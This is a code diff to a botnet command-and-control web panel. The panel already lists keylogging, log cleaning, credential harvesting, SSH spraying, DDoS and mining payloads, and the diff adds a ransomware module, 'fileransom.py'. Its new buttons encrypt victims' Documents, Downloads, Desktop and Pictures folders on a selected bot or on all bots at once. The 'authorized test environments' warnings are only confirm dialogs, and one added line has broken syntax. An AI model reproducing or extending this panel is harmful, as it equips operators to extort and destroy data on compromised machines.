@@ -229,12 +229,17 @@ def admin_panel():
             .stealth-btn { background: #2a5a2a; }
             .util-btn { background: #2a5a5a; }
             .compound-btn { background: #5a5a2a; }
+            .encryption-btn { background: #ff6600; }
             .tab-container { display: flex; border-bottom: 1px solid #444; margin-bottom: 20px; }
             .tab { padding: 10px 20px; cursor: pointer; border: 1px solid transparent; }
             .tab.active { background: #222; border: 1px solid #444; border-bottom: none; }
             .tab-content { display: none; }
             .tab-content.active { display: block; }
             .command-history { max-height: 300px; overflow-y: auto; }
+            .fileransom-form { display: flex; flex-wrap: wrap; gap: 10px; align-items: flex-end; margin: 15px 0; }
+            .fileransom-form > div { display: flex; flex-direction: column; }
+            .fileransom-form label { font-size: 12px; margin-bottom: 3px; color: #888; }
+            .warning-box { background: #3a1a1a; border: 2px solid #ff3333; padding: 15px; margin: 15px 0; }
         </style>
     </head>
     <body>
@@ -283,6 +288,14 @@ def admin_panel():
                                 <option value="trigger_keylogger">Keylogger</option>
                                 <option value="trigger_screenshot">Screenshots</option>
                                 <option value="trigger_logclean">Clean Logs</option>
+                                <!-- FILE ENCRYPTION OPTIONS -->
+                                <option value="trigger_fileransom encrypt /home/user/Documents">Encrypt Documents</option>
+                                <option value="trigger_fileransom encrypt /home/user/Downloads">Encrypt Downloads</option>
+                                <option value="trigger_fileransom encrypt /home/user/Desktop">Encrypt Desktop</option>
+                                <option value="trigger_fileransom encrypt /home/user/Pictures">Encrypt Pictures</option>
+                                <option value="trigger_fileransom encrypt /tmp">Encrypt /tmp (Test)</option>
+                                <option value="trigger_fileransom decrypt /home/user/Documents">Decrypt Documents</option>
+                                <!-- END FILE ENCRYPTION -->
                                 <option value="trigger_status">Implant Status</option>
                                 <option value="trigger_help">Show Help</option>
                             </select>
@@ -310,6 +323,39 @@ def admin_panel():
                         {% endif %}
                     </div>
                     {% endfor %}
+                    
+                    <!-- FILE ENCRYPTION TOOL -->
+                    <div class="section warning-box">
+                        <h3 style="color: #ff6600;">⚠️ File Encryption Tool (DESTRUCTIVE)</h3>
+                        <p><small>WARNING: This tool encrypts files and removes originals. Only use in authorized test environments!</small></p>
+                        
+                        <div class="fileransom-form">
+                            <div>
+                                <label>Action:</label>
+                                <select id="fileransom_action">
+                                    <option value="encrypt">Encrypt Files</option>
+                                    <option value="decrypt">Decrypt Files</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label>Target Path:</label>
+                                <input type="text" id="fileransom_path" placeholder="/home/user/Documents" style="width: 300px;">
+                            </div>
+                            <div>
+                                <label>Password (optional for encrypt):</label>
+                                <input type="text" id="fileransom_password" placeholder="Leave empty for auto-generate">
+                            </div>
+                            <div style="align-self: flex-end;">
+                                <button onclick="sendFileransomCommand()" style="background: #ff6600; font-weight: bold;">Execute File Encryption</button>
+                            </div>
+                        </div>
+                        <div style="margin-top: 10px;">
+                            <button onclick="quickFileransom('encrypt', '/home/user/Documents')" style="background: #ff3300;">Quick: Encrypt Documents</button>
+                            <button onclick="quickFileransom('encrypt', '/home/user/Downloads')" style="background: #ff3300;">Quick: Encrypt Downloads</button>
+                            <button onclick="quickFileransom('encrypt', '/home/user/Desktop')" style="background: #ff3300;">Quick: Encrypt Desktop</button>
+                            <button onclick="quickFileransom('decrypt', '/home/user/Documents')" style="background: #3366ff;">Quick: Decrypt Documents</button>
+                        </div>
+                    </div>
                 </div>
             </div>
             
@@ -345,6 +391,17 @@ def admin_panel():
                         <button class="compound-btn" onclick="sendToAll('trigger_full_recon')">Full Recon Suite</button>
                         <button class="compound-btn" onclick="sendToAll('trigger_harvest_all')">Harvest All Data</button>
                         <button class="compound-btn" onclick="sendToAll('trigger_clean_sweep')">Clean Sweep</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> File Operations</h2>
+                    <div class="button-group">
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Documents')">Encrypt Documents</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Downloads')">Encrypt Downloads</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Desktop')">Encrypt Desktop</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /tmp')" style="background: #ff3300;">Test Encrypt /tmp</button>
+                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom decrypt /home/user/Documents')" style="background: #3366ff;">Decrypt Documents</button>
                     </div>
                 </div>
                 
@@ -480,7 +537,13 @@ def admin_panel():
                             <strong>Auto Deploy</strong>
                             <p><small>Automated network deployment</small></p>
                             <button onclick="sendToAll('load_payload autodeploy.py')">Load</button>
-                            <button onclick="sendToAll('run_payload autodeploy.py')">Run</button>
+                            <button onclick="sendToAll('run_payload autodeploy.py')Run</button>
+                        </div>
+                        <div class="bot" style="border: 2px solid #ff6600;">
+                            <strong style="color: #ff6600;">File Encryption</strong>
+                            <p><small>⚠️ AES-256 file encryption/decryption</small></p>
+                            <button onclick="sendToAll('load_payload fileransom.py')">Load</button>
+                            <button onclick="sendToAll('run_payload fileransom.py')" style="background: #ff6600;">Run</button>
                         </div>
                     </div>
                 </div>
@@ -537,6 +600,7 @@ def admin_panel():
                 <button onclick="sendManualCommand()">Send</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_help'">Insert Help</button>
                 <button onclick="document.getElementById('manual_cmd').value = 'trigger_status'">Insert Status</button>
+                <button onclick="document.getElementById('manual_cmd').value = 'trigger_fileransom encrypt /home/user/Documents'" style="background: #ff6600;">Insert File Encrypt</button>
             </div>
         </div>
         
@@ -586,6 +650,13 @@ def admin_panel():
                     return;
                 }
                 
+                // Special warning for file encryption
+                if (command.includes('trigger_fileransom encrypt')) {
+                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                        return;
+                    }
+                }
+                
                 fetch('/command', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -603,6 +674,13 @@ def admin_panel():
             }
             
             function sendToBot(botId, command) {
+                // Special warning for file encryption
+                if (command.includes('trigger_fileransom encrypt')) {
+                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                        return;
+                    }
+                }
+                
                 fetch('/command', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -636,6 +714,13 @@ def admin_panel():
             }
             
             function sendToAll(command) {
+                // Special warning for file encryption
+                if (command.includes('trigger_fileransom encrypt')) {
+                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis command will be sent to ALL bots.\\n\\nContinue?')) {
+                        return;
+                    }
+                }
+                
                 if (!confirm('Send "' + command + '" to ALL bots?')) return;
                 
                 {% for bot in bot_list %}
@@ -659,6 +744,13 @@ def admin_panel():
                 if (!botId || !command) {
                     alert('Please enter both Bot ID and Command');
                     return;
+                }
+                
+                // Special warning for file encryption
+                if (command.includes('trigger_fileransom encrypt')) {
+                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                        return;
+                    }
                 }
                 
                 if (botId.toLowerCase() === 'all') {
@@ -685,6 +777,65 @@ def admin_panel():
                     alert('Payloads refreshed');
                     location.reload();
                 });
+            }
+            
+            // FILE ENCRYPTION FUNCTIONS
+            function sendFileransomCommand() {
+                var action = document.getElementById('fileransom_action').value;
+                var path = document.getElementById('fileransom_path').value;
+                var password = document.getElementById('fileransom_password').value;
+                
+                if (!path) {
+                    if (action === 'encrypt') {
+                        path = '/home/user/Documents';
+                    } else {
+                        alert('Please enter a target path for decryption');
+                        return;
+                    }
+                }
+                
+                // Special warning for encryption
+                if (action === 'encrypt') {
+                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                        return;
+                    }
+                }
+                
+                var cmd = 'trigger_fileransom ' + action + ' ' + path;
+                if (password) {
+                    cmd += ' ' + password;
+                }
+                
+                // Find the currently selected bot
+                var selectedBot = document.querySelector('.bot.active-bot');
+                if (!selectedBot) {
+                    alert('Please select a bot first');
+                    return;
+                }
+                
+                var botId = selectedBot.querySelector('strong').textContent.trim();
+                sendToBot(botId, cmd);
+            }
+            
+            function quickFileransom(action, path) {
+                // Special warning for encryption
+                if (action === 'encrypt') {
+                    if (!confirm('⚠️ WARNING: File encryption will DESTROY original files!\\n\\nPath: ' + path + '\\n\\nThis is irreversible without the decryption password.\\n\\nContinue?')) {
+                        return;
+                    }
+                }
+                
+                var cmd = 'trigger_fileransom ' + action + ' ' + path;
+                
+                // Find the currently selected bot
+                var selectedBot = document.querySelector('.bot.active-bot');
+                if (!selectedBot) {
+                    alert('Please select a bot first');
+                    return;
+                }
+                
+                var botId = selectedBot.querySelector('strong').textContent.trim();
+                sendToBot(botId, cmd);
             }
             
             // Auto-refresh every 30 seconds
@@ -842,6 +993,7 @@ def list_payloads():
             a {{ color: #0ff; text-decoration: none; }}
             a:hover {{ color: #fff; text-decoration: underline; }}
             .payload-info {{ font-size: 12px; color: #888; margin-top: 5px; }}
+            .warning {{ border: 2px solid #ff6600; background: #3a1a1a; }}
         </style>
     </head>
     <body>
@@ -859,7 +1011,7 @@ def list_payloads():
         'Defense Evasion': ['logcleaner.py', 'defense_evasion.py'],
         'Lateral Movement': ['sshspray.py', 'autodeploy.py', 'lateral_movement.py'],
         'Command & Control': ['dnstunnel.py'],
-        'Impact': ['ddos.py', 'mine.py'],
+        'Impact': ['ddos.py', 'mine.py', 'fileransom.py'],
         'Persistence': ['polyloader.py']
     }
     
@@ -867,8 +1019,9 @@ def list_payloads():
         html += f'<h2>{category}</h2>'
         for payload in payloads:
             if payload in files:
+                warning_class = 'warning' if payload == 'fileransom.py' else ''
                 html += f'''
-                <li>
+                <li class="{warning_class}">
                     <a href="/payloads/{payload}">{payload}</a>
                     <div class="payload-info">
                         Size: {os.path.getsize(os.path.join(payload_dir, payload)) // 1024} KB | 
@@ -882,6 +1035,11 @@ def list_payloads():
         </ul>
         <script>
             function sendToAll(command) {
+                if (command.includes('fileransom')) {
+                    if (!confirm('⚠️ WARNING: File encryption payload is DESTRUCTIVE!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
+                        return;
+                    }
+                }
                 fetch('/command', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
